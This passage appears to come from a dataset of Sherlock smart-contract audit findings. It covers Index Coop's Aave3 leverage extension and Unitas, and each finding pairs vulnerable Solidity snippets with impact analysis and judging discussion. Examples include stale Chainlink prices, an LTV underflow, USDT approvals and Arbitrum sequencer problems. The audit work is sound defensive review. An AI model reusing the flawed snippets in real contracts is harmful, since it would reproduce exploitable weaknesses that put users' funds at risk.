borrow is calculated as:\n     * (Net borrow limit in USD - existing borrow value in USD) / collateral asset price adjusted for decimals\n     *\n     * For delever, max repay is calculated as:\n     * Collateral balance in base units * (net borrow limit in USD - existing borrow value in USD) / net borrow limit in USD\n     *\n     * Net borrow limit for levering is calculated as:\n     * The collateral value in USD * Aave collateral factor * (1 - unutilized leverage %)\n     *\n     * Net repay limit for delevering is calculated as:\n     * The collateral value in USD * Aave liquiditon threshold * (1 - unutilized leverage %)\n     *\n     * return uint256          Max borrow notional denominated in collateral asset\n     */\n    function _calculateMaxBorrowCollateral(ActionInfo memory _actionInfo, bool _isLever) internal view returns(uint256) {\n\n        // Retrieve collateral factor and liquidation threshold for the collateral asset in precise units (1e16 = 1%)\n        ( , uint256 maxLtvRaw, uint256 liquidationThresholdRaw, , , , , , ,) = strategy.aaveProtocolDataProvider.getReserveConfigurationData(address(strategy.collateralAsset));\n\n        // Normalize LTV and liquidation threshold to precise units. LTV is measured in 4 decimals in Aave which is why we must multiply by 1e14\n        // for example ETH has an LTV value of 8000 which represents 80%\n        if (_isLever) {\n            uint256 netBorrowLimit = _actionInfo.collateralValue\n                .preciseMul(maxLtvRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return netBorrowLimit\n                .sub(_actionInfo.borrowValue)\n                .preciseDiv(_actionInfo.collateralPrice);\n        } else {\n            uint256 netRepayLimit = _actionInfo.collateralValue\n                .preciseMul(liquidationThresholdRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return _actionInfo.collateralBalance\n                .preciseMul(netRepayLimit.sub(_actionInfo.borrowValue))\n                .preciseDiv(netRepayLimit);\n        }\n    }\n```\n\nApart from the aforementioned issue with `LTV = 0` tokens, there's another issue with the `_calculateMaxBorrowCollateral()` function. When `LTV = 0`, `maxLtvRaw` also equals 0, leading to a `netBorrowLimit` of 0. When the borrowing value is subtracted from this, it results in an underflow, causing the borrowing limit to appear incredibly large. This essentially breaks the borrowing logic of the protocol.ч"The protocol should consider implementing additional protections against tokens with an LTV of 0.\nDiscussion\nckoopmann\nThis raises a good point that wasn't fully considered during the design. We will investigate this.\nGenerally I don't think the ""Impact"" section is accurate though as users cannot borrow assets on behalf of the token. However if the previous information is accurate it could have an affect on issuance / redemption if the aToken transfers are blocked.\nckoopmann\nI set this to confirmed as the issue raises valid questions / scenarios that weren't fully considered during the design. Unfortunately the recommendation is pretty vague and not very actionable.\nAfter digging into this audit report it seems that at least there are protections in place on aave side that no malicious user could produce such a situation by sending us aTokens with ltv=0 or something like that. So the only scenario where this situation could arise would be if aave governance sets the LTV of the collateral token we are using to 0.\nOne potential change that could allow us to delever the token in such a situation could be to add flashloan based delevering as also suggested in this issue: https://github.com/sherlock-audit/2023-05-Index-judging/issues/255\nckoopmann\nAlso see this issue on the morpho spearbit audit for reference. (You will have to create an account solodit to access it) - note that the ""Vulernability Detail"" section seems to be copy / pasted from that report: https://solodit.xyz/issues/16216\nckoopmann\nAfter rereading this more carefully it seems the above listed limitations only affect a second aToken with `LTV > 0`. So for this scenario to come into effect we would have to have two aTokens as components in the set, one of which would have `LTV = 0` and the other one (which would not be able to be transfered anymore) would have `LTV > 0`.\nWhile the issue seems to be valid, if the above understanding is correct we might keep the logic as is and list this as an explicit limitation. Because the strategy extension is designed to work with only one aToken anyway. (The Set Token could have another aToken as a component that is not managed as part of the leverage strategy but this should be avoided and is certainly not part of the expected use)\n0xffff11\n`While the issue seems to be valid, if the above understanding is correct we might keep the logic as is and list this as an explicit limitation` Keeping the issue as a med because there is still a small possibility for this to happen even though it is not the intended behavior: `he Set Token could have another aToken as a component that is not managed as part of the leverage strategy but this should be avoided and is certainly not part of the expected use`"чThis bug could potentially disrupt the entire borrowing logic within the protocol by inflating the perceived borrowing limit. This could lead to users borrowing an unlimited amount of assets due to the underflow error. In extreme cases, this could lead to a potential loss of user funds or even a complete protocol shutdown, thus impacting user trust and the overall functionality of the protocol.\nCode Snippet\nTool used\nManual Review
no validation to ensure the arbitrum sequencer is downчmediumч```\n int256 rawCollateralPrice = strategy.collateralPriceOracle.latestAnswer();\n        rebalanceInfo.collateralPrice = rawCollateralPrice.toUint256().mul(10 ** strategy.collateralDecimalAdjustment);\n        int256 rawBorrowPrice = strategy.borrowPriceOracle.latestAnswer();\n        rebalanceInfo.borrowPrice = rawBorrowPrice.toUint256().mul(10 ** strategy.borrowDecimalAdjustment);\n```\nчThere is no validation to ensure sequencer is down\n```\n int256 rawCollateralPrice = strategy.collateralPriceOracle.latestAnswer();\n        rebalanceInfo.collateralPrice = rawCollateralPrice.toUint256().mul(10 ** strategy.collateralDecimalAdjustment);\n        int256 rawBorrowPrice = strategy.borrowPriceOracle.latestAnswer();\n        rebalanceInfo.borrowPrice = rawBorrowPrice.toUint256().mul(10 ** strategy.borrowDecimalAdjustment);\n```\n\nUsing Chainlink in L2 chains such as Arbitrum requires to check if the sequencer is down to avoid prices from looking like they are fresh although they are not.\nThe bug could be leveraged by malicious actors to take advantage of the sequencer downtime.чrecommend to add checks to ensure the sequencer is not down.\nDiscussion\nckoopmann\nSeems to be correct however I'm not sure regarding validity / severity since this is specific to L2 and not relevant for our current deployment strategy on Ethereum.чwhen sequencer is down, stale price is used for oracle and the borrow value and collateral value is calculated and the protocol can be forced to rebalance in a loss position\nCode Snippet\nTool used\nManual Review
Chainlink price feed is `deprecated`, not sufficiently validated and can return `stale` prices.чmediumч```\nfunction _createActionInfo() internal view returns(ActionInfo memory) {\n        ActionInfo memory rebalanceInfo;\n\n        // Calculate prices from chainlink. Chainlink returns prices with 8 decimal places, but we need 36 - underlyingDecimals decimal places.\n        // This is so that when the underlying amount is multiplied by the received price, the collateral valuation is normalized to 36 decimals.\n        // To perform this adjustment, we multiply by 10^(36 - 8 - underlyingDecimals)\n        int256 rawCollateralPrice = strategy.collateralPriceOracle.latestAnswer();\n        rebalanceInfo.collateralPrice = rawCollateralPrice.toUint256().mul(10 ** strategy.collateralDecimalAdjustment);\n        int256 rawBorrowPrice = strategy.borrowPriceOracle.latestAnswer();\n        rebalanceInfo.borrowPrice = rawBorrowPrice.toUint256().mul(10 ** strategy.borrowDecimalAdjustment);\n// More Code// rest of code.\n}\n   \n```\nчThe function `_createActionInfo()` uses Chainlink's deprecated latestAnswer function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale and there is no additional checks to ensure that the return values are valid.\nThe internal function `_createActionInfo()` uses calls `strategy.collateralPriceOracle.latestAnswer()` and `strategy.borrowPriceOracle.latestAnswer()` that uses Chainlink's deprecated latestAnswer() to get the latest price. However, there is no check for if the return value is a stale data.\n```\nfunction _createActionInfo() internal view returns(ActionInfo memory) {\n        ActionInfo memory rebalanceInfo;\n\n        // Calculate prices from chainlink. Chainlink returns prices with 8 decimal places, but we need 36 - underlyingDecimals decimal places.\n        // This is so that when the underlying amount is multiplied by the received price, the collateral valuation is normalized to 36 decimals.\n        // To perform this adjustment, we multiply by 10^(36 - 8 - underlyingDecimals)\n        int256 rawCollateralPrice = strategy.collateralPriceOracle.latestAnswer();\n        rebalanceInfo.collateralPrice = rawCollateralPrice.toUint256().mul(10 ** strategy.collateralDecimalAdjustment);\n        int256 rawBorrowPrice = strategy.borrowPriceOracle.latestAnswer();\n        rebalanceInfo.borrowPrice = rawBorrowPrice.toUint256().mul(10 ** strategy.borrowDecimalAdjustment);\n// More Code// rest of code.\n}\n   \n```\nч"The `latestRoundData` function should be used instead of the deprecated `latestAnswer` function and add sufficient checks to ensure that the pricefeed is not stale.\n```\n(uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();\n            require(answeredInRound >= roundId, ""price is stale"");\n            require(updatedAt > 0, ""round is incomplete"");\n```\n\nDiscussion\n0xffff11\nSponsor comments:\n```\nGood point to switch away from using the deprecated method, which we will look into.\nHowever from this issue it is not clear how / if there is any actual vulnerability resulting from the use of this method.\n--\nAgree with @ckoopmann , the proposed fix of using latestRoundData() looks reasonable to me\n--\nI switched to confirmed / disagree with severity as this issue is factually correct and will result in us changing the code, but does not seem to have any real adverse consequences.\n```\n\n0xffff11\nI do believe that this should remain as a medium. Not just for the impact stated by the watson, but also because Chainlink might simply not support it anymore in the future.\nckoopmann\nSwitched to using `latestRoundData` and adding a configurable maxPriceAge that is compared against the `updatedAt` value. Fixed in: https://github.com/IndexCoop/index-coop-smart-contracts/pull/142"чThe function `_createActionInfo()` is used to return important values used throughout the contract, the staleness of the chainlinklink return values will lead to wrong calculation of the collateral and borrow prices and other unexpected behavior.\nCode Snippet\nTool used\nManual Review
The protocol does not compatible with token such as USDT because of the Approval Face Protectionчmediumч```\nActionInfo memory deleverInfo = _createAndValidateActionInfo(\n  _setToken,\n  _collateralAsset,\n  _repayAsset,\n  _redeemQuantityUnits,\n  _minRepayQuantityUnits,\n  _tradeAdapterName,\n  false\n );\n```\nч"The protocol does not compatible with token such as USDT because of the Approval Face Protection\nthe protocol is intended to interact with any ERC20 token and USDT is a common one\nQ: Which ERC20 tokens do you expect will interact with the smart contracts? The protocol expects to interact with any ERC20.\nIndividual SetToken's should only interact with ERC20 chosen by the SetToken manager.\nwhen doing the deleverage\nfirst, we construct the deleverInfo\n```\nActionInfo memory deleverInfo = _createAndValidateActionInfo(\n  _setToken,\n  _collateralAsset,\n  _repayAsset,\n  _redeemQuantityUnits,\n  _minRepayQuantityUnits,\n  _tradeAdapterName,\n  false\n );\n```\n\nthen we withdraw from the lending pool, execute trade and repay the borrow token\n```\n_withdraw(deleverInfo.setToken, deleverInfo.lendingPool, _collateralAsset, deleverInfo.notionalSendQuantity);\n\n        uint256 postTradeReceiveQuantity = _executeTrade(deleverInfo, _collateralAsset, _repayAsset, _tradeData);\n\n        uint256 protocolFee = _accrueProtocolFee(_setToken, _repayAsset, postTradeReceiveQuantity);\n\n        uint256 repayQuantity = postTradeReceiveQuantity.sub(protocolFee);\n\n        _repayBorrow(deleverInfo.setToken, deleverInfo.lendingPool, _repayAsset, repayQuantity);\n```\n\nthis is calling _repayBorrow\n```\n/**\n * @dev Invoke repay from SetToken using AaveV2 library. Burns DebtTokens for SetToken.\n */\nfunction _repayBorrow(ISetToken _setToken, ILendingPool _lendingPool, IERC20 _asset, uint256 _notionalQuantity) internal {\n _setToken.invokeApprove(address(_asset), address(_lendingPool), _notionalQuantity);\n _setToken.invokeRepay(_lendingPool, address(_asset), _notionalQuantity, BORROW_RATE_MODE);\n}\n```\n\nthe trade received (quantity - the protocol fee) is used to repay the debt\nbut the required debt to be required is the (borrowed amount + the interest rate)\nsuppose the only debt that needs to be repayed is 1000 USDT\ntrade received (quantity - the protocol) fee is 20000 USDT\nonly 1000 USDT is used to repay the debt\nbecause when repaying, the paybackAmount is only the debt amount\n```\nuint256 paybackAmount = params.interestRateMode == DataTypes.InterestRateMode.STABLE\n  ? stableDebt\n  : variableDebt;\n```\n\nthen when burning the variable debt token\n```\nreserveCache.nextScaledVariableDebt = IVariableDebtToken(\n reserveCache.variableDebtTokenAddress\n  ).burn(params.onBehalfOf, paybackAmount, reserveCache.nextVariableBorrowIndex);\n```\n\nonly the ""payback amount"", which is 1000 USDT is transferred to pay the debt,\nthe excessive leftover amount is (20000 USDT - 1000 USDT) = 19000 USDT\nbut if we lookback into the repayBack function\n```\n/**\n * @dev Invoke repay from SetToken using AaveV2 library. Burns DebtTokens for SetToken.\n */\nfunction _repayBorrow(ISetToken _setToken, ILendingPool _lendingPool, IERC20 _asset, uint256 _notionalQuantity) internal {\n _setToken.invokeApprove(address(_asset), address(_lendingPool), _notionalQuantity);\n _setToken.invokeRepay(_lendingPool, address(_asset), _notionalQuantity, BORROW_RATE_MODE);\n}\n```\n\nthe approved amount is 20000 USDT, but only 1000 USDT approval limit is used, we have 19000 USDT approval limit left\naccording to\nhttps://github.com/d-xo/weird-erc20#approval-race-protections\nSome tokens (e.g. OpenZeppelin) will revert if trying to approve the zero address to spend tokens (i.e. a call to approve(address(0), amt)).\nIntegrators may need to add special cases to handle this logic if working with such a token.\nUSDT is such token that subject to approval race condition, without approving 0 first, the second approve after first repay will revert"чApproval 0 first\nDiscussion\npblivin0x\nLooks reasonable to add a preceding zero approval here `_setToken.invokeApprove(address(_asset), address(_lendingPool), 0);`\n0xffff11\nValid medium\nckoopmann\nStill having some final discussion internally over wether to fix this or explicitly list USDT as an incompatible token.\nckoopmann\nFixed in: https://github.com/IndexCoop/index-protocol/pull/22\nSpecifically in the following commit by preceding any approve transaction with a 0 approval: https://github.com/IndexCoop/index-protocol/pull/22/commits/dae4d65ae8a95f9044b4c2edccaa394dbff451f3\nbizzyvinci\n@ckoopmann some of the duplicates such as #39 and #129 are about the AmmModuleчsecond and following repay borrow will revert if the ERC20 token is subject to approval race condition\nCode Snippet\nTool used\nManual Review
Operator is blocked when sequencer is down on Arbitrumчmediumч```\nL2_Alias = L1_Contract_Address + 0x1111000000000000000000000000000000001111\n```\nчWhen the sequencer is down on Arbitrum state changes can still happen on L2 by passing them from L1 through the Delayed Inbox.\nUsers can still interact with the Index protocol but due to how Arbitrum address aliasing functions the operator will be blocked from calling onlyOperator().\nThe `msg.sender` of a transaction from the Delayed Inbox is aliased:\n```\nL2_Alias = L1_Contract_Address + 0x1111000000000000000000000000000000001111\n```\n\nAll functions with the `onlyOperator()` modifier are therefore blocked when the sequencer is down.\nThe issue exists for all modifiers that are only callable by specific EOAs. But the operator of the Aave3LeverageStrategyExtension is the main security risk.ч"Change the `onlyOperator()` to check if the address is the aliased address of the operator.\nDiscussion\nhildingr\nEscalate for 10 USDC\nThis is not a duplicate off #262 and should be a separate issue.\nThis is not about a check if a sequencer is down but rather a peculiarity on how Arbitrum aliases addresses. On the other L2s the manager is still able to reach all functions when the sequencer is down since the aliasing is not done on EOA's initiating a L1->L2 call.\nOn Arbitrum this is not the case and the manager/operators are completely blocked from controlling the protocol when the sequencer is down.\nAs it stands on the other L2's the manager/operators can still govern over the protocol and use all the available safety features if the sequencer is down. As it stands this is not possible on Arbitrum.\nLow probability event where it would be crucial for operator/manager to have access:\nSequencer is down for a prolonged time this could be some kind of attack or a technical issue, couple this with volatility in the market either due to the issues with the sequencer or unrelated. The governance should be able to change the safe parameters of position during such an event.\nThe recommended changes in the duplicates actually makes this worse in some cases since repaying debt is completely blocked when the sequencer is down. This is not the case for normal AAVE users which always have the ability to repay loans, this is an important safety feature guaranteed by AAVE.\nThis can be taken further if the Index Team wishes to have the same safety level as a native AAVE user.\nNew functionality can be added to allow the operator to repay debt and de-leverage when the sequencer is down. This is a safety feature available to all AAVE users, AAVE users are never blocked from repaying debt but only from taking out additional loans when the sequencer is down.\nThis can be done by allowing a new operator L1Operator to access a new rebalancing feature, this L1Operator is a L1 smart-contract that uses L1 oracle data to initiate a L2 repayment of debt and rebalance when the sequencer is down.\nsherlock-admin\nEscalate for 10 USDC\nThis is not a duplicate off #262 and should be a separate issue.\nThis is not about a check if a sequencer is down but rather a peculiarity on how Arbitrum aliases addresses. On the other L2s the manager is still able to reach all functions when the sequencer is down since the aliasing is not done on EOA's initiating a L1->L2 call.\nOn Arbitrum this is not the case and the manager/operators are completely blocked from controlling the protocol when the sequencer is down.\nAs it stands on the other L2's the manager/operators can still govern over the protocol and use all the available safety features if the sequencer is down. As it stands this is not possible on Arbitrum.\nLow probability event where it would be crucial for operator/manager to have access:\nSequencer is down for a prolonged time this could be some kind of attack or a technical issue, couple this with volatility in the market either due to the issues with the sequencer or unrelated. The governance should be able to change the safe parameters of position during such an event.\nThe recommended changes in the duplicates actually makes this worse in some cases since repaying debt is completely blocked when the sequencer is down. This is not the case for normal AAVE users which always have the ability to repay loans, this is an important safety feature guaranteed by AAVE.\nThis can be taken further if the Index Team wishes to have the same safety level as a native AAVE user.\nNew functionality can be added to allow the operator to repay debt and de-leverage when the sequencer is down. This is a safety feature available to all AAVE users, AAVE users are never blocked from repaying debt but only from taking out additional loans when the sequencer is down.\nThis can be done by allowing a new operator L1Operator to access a new rebalancing feature, this L1Operator is a L1 smart-contract that uses L1 oracle data to initiate a L2 repayment of debt and rebalance when the sequencer is down.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xffff11\nThanks. I think the changes of this happening are slim to non. Sequencer has to be down and at the same time the operator rebalance. Also, I the operator is a multisig, not an EOA, unsure if that makes any difference, but still, I do not see the medium here. @IAm0x52 thoughts?\nIAm0x52\nDue to the ripcord function always being available to prevent set token liquidation, low seems more appropriate to me.\n0xffff11\nThanks for the second opinion. As said above, I agree with low\nhrishibhat\nAgree with the Lead Judge and Watson on this being low @hildingr\nhildingr\nI will have to disagree here. The ripcord can not be trusted when the sequencer is down. The price could move in either direction while the Oracle price is stale.\nImagine if the price is moving in a direction that would allow a ripcord pull, the ripcord can not be pulled since the oracle has the stale price.\nOn optimism and polygon the operator can call disengage() and stop the protocol from going above the max liquidation ratio. On Arbitrum this is not possible and the position can go way beyond the max LTV without being able to delever. The position could even get liquidated before ripcord or disengage can be called. If 0.95 < HF < 1 the position can be instantly liquidated when the sequencer comes back up since no grace period is given to heavily undercollateralized positions.\nckoopmann\nI don't have a strong opinion on wether this is low or medium so will leave it up to the lead watson / judge to decide.\nSince we are not planning to deploy on arbitrum for now we will not act on this issue for now, but will review should we deploy this there in the future.\nhrishibhat\n@hildingr Additional comment from the Lead watson.\nThe key consideration here is that the main intention here is to keep the set token from becoming liquidated. So it doesn't really matter what the oracle is at whether it's stale or completely wrong. As long as the oracle being used by the set token matches AAVE then that's all that matters. So as I've stated, ripcord will always protect the set token so this is low\nhildingr\n@hildingr Additional comment from the Lead watson.\nThe key consideration here is that the main intention here is to keep the set token from becoming liquidated. So it doesn't really matter what the oracle is at whether it's stale or completely wrong. As long as the oracle being used by the set token matches AAVE then that's all that matters. So as I've stated, ripcord will always protect the set token so this is low\nI disagree, the ripcord will not always protect the position. I will give a concrete example:\nStage 1, the sequencer is up: HF = 1.5\nStage 2, the sequencer is down: HF is -> 1. ripcord can not be pulled due to incorrect internal LTV.\nStage 3, sequencer still down: HF < 0.95.\nStage 4, the moment the sequencer comes up: Race condition between instant liquidation and pulling the ripcord. This is because HF < 0.95 and no grace period is given by the AAVE sentinel.\nThe true LTV always matters even if AAVE and Index use the same stale oracle. We can look at it as a discontinuity in the LTV, when the seq is down it is ""unknown"" to both protocols but in the instant the sequencer comes back the LTV jumps to the true value. The true LTV can be in very dangerous territory, possibly high enough for instant liquidation.\nIAm0x52\nStage 4, the moment the sequencer comes up: Race condition between instant liquidation and pulling the ripcord. This is because HF < 0.95 and no grace period is given by the AAVE sentinel.\nThis is correct. it would create race conditions under these circumstances\nhrishibhat\nResult: Medium Unique Considering this a valid medium based on the above comments\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nhildingr: accepted"чThe operator has roles that are vital for the safety of the protocol. Re-balancing and issuing/redeeming can still be done when the sequencer is down it is therefore important that the operator call the necessary functions to operate the protocol when the sequencer is down.\n`disengage()` is an important safety function that the operator should always have access especially when the protocol is still in accessible to other users. Changing methodology and adding/removing exchanges are also important for the safety of the protocol.\nCode Snippet\nTool used\nManual Review
Oracle Price miss matched when E-mode uses single oracleчmediumч```\n        if (_isLever) {\n            uint256 netBorrowLimit = _actionInfo.collateralValue\n                .preciseMul(maxLtvRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return netBorrowLimit\n                .sub(_actionInfo.borrowValue)\n                .preciseDiv(_actionInfo.collateralPrice);\n        } else {\n            uint256 netRepayLimit = _actionInfo.collateralValue\n                .preciseMul(liquidationThresholdRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return _actionInfo.collateralBalance\n                .preciseMul(netRepayLimit.sub(_actionInfo.borrowValue)) \n                .preciseDiv(netRepayLimit);\n        \n```\nчAAVE3 can turn on single oracle use on any E-mode category. When that is done collateral and the borrowed assets will be valued based on a single oracle price. When this is done the prices used in AaveLeverageStrategyExtension can differ from those used internally in AAVE3.\nThis can lead to an increased risk of liquidation and failures to re-balance properly.\nThere is currently no accounting for single oracle use in the AaveLeverageStragyExtension, if AAVE3 turns it on the extension will simply continue using its current oracles without accounting for the different prices.\nWhen re-balancing the following code calculate the netBorrowLimit/netRepayLimit:\n```\n        if (_isLever) {\n            uint256 netBorrowLimit = _actionInfo.collateralValue\n                .preciseMul(maxLtvRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return netBorrowLimit\n                .sub(_actionInfo.borrowValue)\n                .preciseDiv(_actionInfo.collateralPrice);\n        } else {\n            uint256 netRepayLimit = _actionInfo.collateralValue\n                .preciseMul(liquidationThresholdRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return _actionInfo.collateralBalance\n                .preciseMul(netRepayLimit.sub(_actionInfo.borrowValue)) \n                .preciseDiv(netRepayLimit);\n        \n```\n\nThe `_actionInfo.collateralValue` and `_adminInfo.borrowValue` are `_getAndValidateLeverageInfo()` where they are both retrieved based on the current set chainlink oracle.\nWhen E-mode uses a single oracle price a de-pegging of one of the assets will lead to incorrect values of `netBorrowLimit` and `netRepayLimit` depending on which asset is de-pegging.\n`collateralValue` or `borrowValue` can be either larger or smaller than how they are valued internally in AAVE3.ч"Aave3LeverageStrategyExtension should take single oracle usage into account. `_calcualteMaxBorrowCollateral` should check if there is a discrepancy and adjust such that the `execute.unutilizedLeveragePercentage` safety parameter is honored.\nDiscussion\nsherlock-admin\nEscalate for 10 USDC\nThis issue is similar to #284 but is much more likely to happen in practice. If AAVE turns on single oracle for a category the oracles will be miss-configured this can lead to liquidation and other issues that I have outlined.\nThis is more likely to happen than #284 since single oracle is a feature of E-mode that can be turned on at any time for any E-mode category.\nI want to escalate this to a valid Medium. I recommend that the index team implements functionality that take into account single oracle use which can be turned on at any point.\n```\nYou've deleted an escalation for this issue.\n```\n\nhildingr\nEscalate for 10 USDC\nThis issue is similar to #284 but is much more likely to happen in practice. If AAVE turns on single oracle for a category the oracles will be miss-configured this can lead to liquidation and other issues that I have outlined.\nThis is more likely to happen than #284 since single oracle is a feature of E-mode that can be turned on at any time for any E-mode category.\nI want to escalate this to a valid Medium. I recommend that the index team implements functionality that take into account single oracle use which can be turned on at any point.\nsherlock-admin\nEscalate for 10 USDC\nThis issue is similar to #284 but is much more likely to happen in practice. If AAVE turns on single oracle for a category the oracles will be miss-configured this can lead to liquidation and other issues that I have outlined.\nThis is more likely to happen than #284 since single oracle is a feature of E-mode that can be turned on at any time for any E-mode category.\nI want to escalate this to a valid Medium. I recommend that the index team implements functionality that take into account single oracle use which can be turned on at any point.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xffff11\nEven using a single oracle in E-mode. Both implementations would still use chainlink right?\nhildingr\nYes, but the issue is that when single oracle is turned on one of the assets will be guaranteed to use a different oracle feed in the Index Protocol compared to AAVE. AAVE and Index will value the asset differently which means that the calculations in _calculateMaxBorrowCollateral will be incorrect.\nExample: Initial state: Both index and AAVE use feed 1 for X and feed 2 for Y. Assume E-mode is activated.\nSingle Oracle turned on: AAVE now uses feed 1 as the single oracle feed for the E-mode category, both X and Y will use feed 1.\nNow Y follows feed 1 on AAVE and feed 2 on Index. The calculations in _calculateChunkRebalanceNotional will as a result be incorrect. The magnitude of the error depends on how much and which direction the oracle feeds diverge in.\n0xffff11\nThanks! Seems reasonable to me and I could see the medium here. Thoughts? @IAm0x52\nIAm0x52\nSame underlying divergence issue as #284 though this one definitely has a better example of how that would happen. My take is that these should be duped then presented to Index team as well as Sherlock for a final severity discussion.\nIn the unlikely case that something like this does occur (oracles are different AND diverge) the consequences are tremendous. Ultimately the severity would come down to the likelihood.\nhildingr\nI disagree that this and #284 are duplicates. The issue I identify can happen during the expected behavior of AAVE V3 due to new functionality added in V3 that has not been accounted for in Index.\nThe likelihood is much larger since an Oracle feed mismatch is guaranteed to happen if Single Oracle is turned on. Single Oracle is a feature of AAVE V3, I therefore believe that it should not be considered an unlikely scenario to enter a state with mismatched feeds.\nckoopmann\nEven though it could be seen as an ""external"" / ""admin"" feature, this issue raises a valid concern. Using the AaveOracle instead might acutally be the better choice and we will review internally if we want to make that fix / change.\nTherefore I will mark this issue as ""Sponsor confirmed"".\nWhile this issue seems to go into more detail of how oracle mismatch can happen, the core issue seems to be the same as 284. Therefore this response also applies to both issues.\nhildingr\nEven though it could be seen as an ""external"" / ""admin"" feature, this issue raises a valid concern. Using the AaveOracle instead might acutally be the better choice and we will review internally if we want to make that fix / change.\nTherefore I will mark this issue as ""Sponsor confirmed"".\nWhile this issue seems to go into more detail of how oracle mismatch can happen, the core issue seems to be the same as 284. Therefore this response also applies to both issues.\nI agree that #284 is an admin/external since it is a potential issue that arise due to admin changing a parameter that is ""trusted"".\nWhat I point to is an issue that arise due to index protocol not handling a feature added to AAVE V3. AAVE V3 is built to use E-modes where single oracle is turned on and off, any such event would put index at risk.\nI think it is incorrect to label an issue an ""admin"" issue if it is a consequence of incompatibility with a feature of a protocol being used as expected.\nhrishibhat\nResult: Medium Has duplicates After further discussions internally and the protocol. Considering this issue a valid medium as changing parameters in the external protocol affects index protocol as shown in the issue. Also considering issue #284 as a duplicate the underlying issue originates from the external protocol due to a change in parameters/functionality by the external admin, affecting oracle price. More context on the external admin trust assumptions is updated in the judging guide. https://docs.sherlock.xyz/audits/judging/judging#some-standards-observed\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nhildingr: accepted"ч"When Levering\nIf `collateralValue` is to valued higher than internally in AAVE3 OR If `borrowValue` is to valued lower than internally in AAVE3:\nThe `netBorrowLimit` is larger than it should be we are essentially going to overriding `execute.unutilizedLeveragePercentage` and attempting to borrow more than we should.\nIf `collateralValue` is valued lower than internally in AAVE3 OR If `borrowValue` is to valued higher than internally in AAVE3:\nThe `netBorrowLimit` is smaller than it should be, we are not borrowing as much as we should. Levering up takes longer.\nWhen Delevering\nIf `collateralValue` is to valued higher than internally in AAVE3 OR If `borrowValue` is to valued lower than internally in AAVE3:\nWe will withdraw more collateral and repay more than specified by `execution.unutilizedLeveragePercentage`.\nIf `collateralValue` is valued lower than internally in AAVE3 OR If `borrowValue` is to valued higher than internally in AAVE3:\nWe withdraw less and repay less debt than we should. This means that both `ripcord()` and `disengage()` are not functioning as they, they will not delever as fast they should. We can look at it as `execution.unutilizedLeveragePercentage` not being throttled.\nThe above consequences show that important functionality is not working as expected. ""overriding"" `execution.unutilizedLeveragePercentage` is a serious safety concern.\nCode Snippet\nTool used\nManual Review"
Users may not be able to fully redeem USD1 into USDT even when reserve ratio is above 100%чmediumч```\n            reserveRatio = ScalingUtils.scaleByBases(\n                allReserves * valueBase / liabilities,\n                valueBase,\n                tokenManager.RESERVE_RATIO_BASE()\n            );\n```\nчUsers may not be able to fully redeem USDT even when reserve ratio is above 100%, because of portfolio being taken into the account for calculation.\nReserve ratio shows how many liabilities is covered by reserves, a reserve ratio above 100% guarantees protocol has enough USDT to redeem, the way of calculating reserve ratio is `Reserve Ratio = allReserves / liabilities` and is implemented in Unitas#_getReserveStatus(...) function:\n```\n            reserveRatio = ScalingUtils.scaleByBases(\n                allReserves * valueBase / liabilities,\n                valueBase,\n                tokenManager.RESERVE_RATIO_BASE()\n            );\n```\n\n`allReserves` is the sum of the balance of Unitas and InsurancePool, calculated in Unitas#_getTotalReservesAndCollaterals() function:\n```\n        for (uint256 i; i < tokenCount; i++) {\n            address token = tokenManager.tokenByIndex(tokenTypeValue, i);\n            uint256 tokenReserve = _getBalance(token);\n            uint256 tokenCollateral = IInsurancePool(insurancePool).getCollateral(token);\n\n\n            if (tokenReserve > 0 || tokenCollateral > 0) {\n                uint256 price = oracle.getLatestPrice(token);\n\n\n                reserves += _convert(\n                    token,\n                    baseToken,\n                    tokenReserve,\n                    MathUpgradeable.Rounding.Down,\n                    price,\n                    priceBase,\n                    token\n                );\n\n\n                collaterals += _convert(\n                    token,\n                    baseToken,\n                    tokenCollateral,\n                    MathUpgradeable.Rounding.Down,\n                    price,\n                    priceBase,\n                    token\n                );\n            }\n        }\n```\n\n`liabilities` is the total value of USD1 and USDEMC tokens, calculated in Unitas#_getTotalLiabilities() function:\n```\n        for (uint256 i; i < tokenCount; i++) {\n            address token = tokenManager.tokenByIndex(tokenTypeValue, i);\n            uint256 tokenSupply = IERC20Token(token).totalSupply();\n\n\n            if (token == baseToken) {\n                // Adds up directly when the token is USD1\n                liabilities += tokenSupply;\n            } else if (tokenSupply > 0) {\n                uint256 price = oracle.getLatestPrice(token);\n\n\n                liabilities += _convert(\n                    token,\n                    baseToken,\n                    tokenSupply,\n                    MathUpgradeable.Rounding.Down,\n                    price,\n                    priceBase,\n                    token\n                );\n            }\n        }\n```\n\nSome amount of USDT in both Unitas and InsurancePool is `portfolio`, which represents the current amount of assets used for strategic investments, it is worth noting that after sending `portfolio`, `balance` remains the same, which means `portfolio` is taken into account in the calculation of reserve ratio.\nThis is problematic because `portfolio` is not available when user redeems, and user may not be able to fully redeem for USDT even when protocols says there is sufficient reserve ratio.\nLet's assume :\nUnitas's balance is 10000 USD and its portfolio is 2000 USD, avaliable balance is 8000 USD InsurancePool's balance is 3000 USD and its portfolio is 600 USD, available balance is 2400 USD AllReserves 